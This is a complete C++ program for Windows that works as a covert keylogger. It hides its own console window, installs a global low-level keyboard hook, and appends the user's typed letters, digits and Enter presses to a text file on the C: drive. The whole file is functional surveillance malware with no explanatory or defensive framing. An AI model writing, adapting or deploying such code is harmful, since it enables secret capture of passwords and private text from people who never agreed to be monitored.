#include <iostream>
#include <windows.h>
#include <fstream>

// Hide console window
void hideWindow() {
    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

// Callback function to handle key presses
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
            std::ofstream file("c:\\output.txt", std::ios::app);
            char key = p->vkCode;

            // Check for special keys like Enter
            if (key == VK_RETURN) {
                file << std::endl;
            } else if (key >= 0x30 && key <= 0x5A) { // Numeric and character keys
                file << char(tolower(key)); // Log lowercase letters
            }
            file.close();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    hideWindow();
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
